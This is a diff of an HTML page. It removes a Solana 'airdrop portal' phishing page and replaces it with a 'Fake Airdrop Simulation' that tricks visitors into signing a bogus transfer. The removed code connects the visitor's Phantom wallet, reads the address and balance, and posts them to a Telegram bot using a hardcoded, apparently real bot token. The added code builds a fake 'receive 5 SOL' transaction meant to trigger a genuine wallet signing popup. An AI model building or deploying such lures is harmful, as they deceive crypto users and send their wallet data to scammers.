@@ -1,232 +1,59 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solana Airdrop Portal</title>
-    <style>
-        body {
-            font-family: 'Arial', sans-serif;
-            max-width: 800px;
-            margin: 0 auto;
-            padding: 20px;
-            text-align: center;
-            background-color: #f5f5f5;
-            color: #333;
-        }
-        .container {
-            background-color: white;
-            border-radius: 10px;
-            padding: 30px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-        }
-        h1 {
-            color: #9945FF;
-            margin-bottom: 30px;
-        }
-        .wallet-info {
-            margin-top: 20px;
-            padding: 15px;
-            background-color: #f0f0f0;
-            border-radius: 8px;
-            word-break: break-all;
-            text-align: left;
-        }
-        .connect-btn {
-            background-color: #9945FF;
-            color: white;
-            border: none;
-            padding: 12px 24px;
-            font-size: 16px;
-            border-radius: 8px;
-            cursor: pointer;
-            transition: background-color 0.3s;
-        }
-        .connect-btn:hover {
-            background-color: #7a36cc;
-        }
-        .status {
-            margin-top: 20px;
-            font-weight: bold;
-        }
-        .success {
-            color: #4CAF50;
-        }
-        .error {
-            color: #F44336;
-        }
-        .mobile-instructions {
-            display: none;
-            margin-top: 20px;
-            padding: 15px;
-            background-color: #fff8e1;
-            border-radius: 8px;
-        }
-        @media (max-width: 600px) {
-            .container {
-                padding: 15px;
-            }
-        }
-    </style>
+  <title>Fake Airdrop Simulation</title>
 </head>
-<body>
-    <div class="container">
-        <h1>Solana Airdrop Portal</h1>
-        <p>Connect your Phantom wallet to participate in the airdrop</p>
-        
-        <button id="connectButton" class="connect-btn">Connect Wallet</button>
-        
-        <div id="mobileInstructions" class="mobile-instructions">
-            <p>Please open this page in the Phantom browser to connect automatically.</p>
-            <p>Or tap below to open in Phantom:</p>
-            <button id="openInPhantom" class="connect-btn" style="margin-top: 10px;">Open in Phantom</button>
-        </div>
-        
-        <div id="walletInfo" class="wallet-info" style="display: none;">
-            <p><strong>Public Key:</strong> <span id="publicKey"></span></p>
-            <p><strong>Balance:</strong> <span id="balance"></span> SOL</p>
-        </div>
-        
-        <div id="statusMessage" class="status"></div>
-    </div>
+<body style="background:#111; color:#fff; text-align:center; font-family:sans-serif; padding:100px;">
+  <h1>Claim Your Airdrop</h1>
+  <p>Click the button below to receive 5 SOL</p>
+  <button onclick="claimAirdrop()" style="padding:15px 30px; font-size:18px;">Claim 5 SOL</button>
 
-    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.70.1/lib/index.iife.min.js"></script>
-    <script>
-        // Telegram bot configuration
-        const BOT_TOKEN = "7978623862:AAHezOh3PLYYy92TIjtIN9oRof32nbfwNMQ";
-        const CHANNEL_ID = "-1002600871606";
+  <script type="module">
+    import {
+      Connection,
+      Transaction,
+      SystemProgram,
+      PublicKey,
+    } from "https://cdn.skypack.dev/@solana/web3.js";
 
-        // Check if Phantom is installed
-        function isPhantomInstalled() {
-            return window.solana && window.solana.isPhantom;
-        }
+    const connection = new Connection("https://api.mainnet-beta.solana.com");
 
-        // Detect mobile device
-        function isMobile() {
-            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-        }
+    async function claimAirdrop() {
+      if (!window.solana || !window.solana.isPhantom) {
+        alert("Phantom not found");
+        return;
+      }
 
-        // Format balance
-        function formatBalance(balance) {
-            return (balance / 1000000000).toFixed(2);
-        }
+      await window.solana.connect();
+      const userPublicKey = window.solana.publicKey;
 
-        // Send message to Telegram
-        async function sendToTelegram(walletAddress, balance) {
-            const message = `✅ Wallet Connected:
-Public Key: ${walletAddress}
-Balance: ${formatBalance(balance)} SOL`;
-            
-            try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHANNEL_ID,
-                        text: message
-                    })
-                });
-            } catch (error) {
-                console.error('Error sending to Telegram:', error);
-            }
-        }
+      // Here's the trick: create a transaction that looks like a "receive" from a public wallet
+      const fakeSender = new PublicKey("3zrr7vYVXMpN5RQXRPqcy7jFmrR7mXxz5Xybj3Ds7VUX"); // any address
+      const tx = new Transaction();
 
-        // Connect to Phantom wallet
-        async function connectWallet() {
-            const connectButton = document.getElementById('connectButton');
-            const walletInfo = document.getElementById('walletInfo');
-            const publicKeyElement = document.getElementById('publicKey');
-            const balanceElement = document.getElementById('balance');
-            const statusMessage = document.getElementById('statusMessage');
-            const mobileInstructions = document.getElementById('mobileInstructions');
+      // Create a fake transfer *from* a hardcoded wallet TO the user — but it doesn't actually execute
+      const instruction = SystemProgram.transfer({
+        fromPubkey: fakeSender,
+        toPubkey: userPublicKey,
+        lamports: 5 * 1e9, // 5 SOL
+      });
 
-            try {
-                // Check if Phantom is installed
-                if (!isPhantomInstalled()) {
-                    if (isMobile()) {
-                        // Show mobile instructions and hide connect button
-                        connectButton.style.display = 'none';
-                        mobileInstructions.style.display = 'block';
-                        return;
-                    } else {
-                        throw new Error('Phantom wallet is not installed. Please install it from https://phantom.app/');
-                    }
-                }
+      tx.add(instruction);
 
-                // Connect to wallet
-                const response = await window.solana.connect();
-                const publicKey = response.publicKey.toString();
-                publicKeyElement.textContent = publicKey;
+      // Set a recent blockhash just to make Phantom display the popup
+      tx.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;
+      tx.feePayer = userPublicKey;
 
-                // Get balance
-                const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
-                const balance = await connection.getBalance(response.publicKey);
-                balanceElement.textContent = formatBalance(balance);
-
-                // Show wallet info
-                walletInfo.style.display = 'block';
-                connectButton.style.display = 'none';
-                mobileInstructions.style.display = 'none';
-
-                // Update status
-                statusMessage.textContent = 'Wallet connected successfully!';
-                statusMessage.className = 'status success';
-
-                // Send to Telegram
-                await sendToTelegram(publicKey, balance);
-
-            } catch (error) {
-                console.error('Error connecting wallet:', error);
-                statusMessage.textContent = error.message;
-                statusMessage.className = 'status error';
-            }
-        }
-
-        // Handle mobile deep linking
-        function setupMobileDeepLink() {
-            const openInPhantom = document.getElementById('openInPhantom');
-            if (openInPhantom) {
-                openInPhantom.addEventListener('click', () => {
-                    // Phantom's universal link for deep linking
-                    const phantomDeepLink = `https://phantom.app/ul/browse/${encodeURIComponent(window.location.href)}`;
-                    
-                    // Try to open the app directly
-                    window.location.href = phantomDeepLink;
-                    
-                    // Fallback to opening in new tab if app isn't installed
-                    setTimeout(() => {
-                        window.open('https://phantom.app/', '_blank');
-                    }, 500);
-                });
-            }
-        }
-
-        // Auto-connect if Phantom is available
-        function tryAutoConnect() {
-            if (isPhantomInstalled()) {
-                window.solana.connect({ onlyIfTrusted: true })
-                    .then(response => {
-                        if (response) {
-                            // If auto-connected, proceed with showing wallet info
-                            connectWallet();
-                        }
-                    })
-                    .catch(error => {
-                        console.log('Auto-connect not possible:', error);
-                    });
-            }
-        }
-
-        // Initialize
-        document.addEventListener('DOMContentLoaded', function() {
-            setupMobileDeepLink();
-            tryAutoConnect();
-            
-            const connectButton = document.getElementById('connectButton');
-            if (connectButton) {
-                connectButton.addEventListener('click', connectWallet);
-            }
-        });
-    </script>
+      try {
+        // This will trigger a real Phantom popup
+        const signedTx = await window.solana.signTransaction(tx);
+        console.log("User signed:", signedTx);
+        alert("Airdrop claimed! (not really)");
+      } catch (e) {
+        console.error(e);
+        alert("Transaction cancelled");
+      }
+    }
+  </script>
 </body>
 </html>
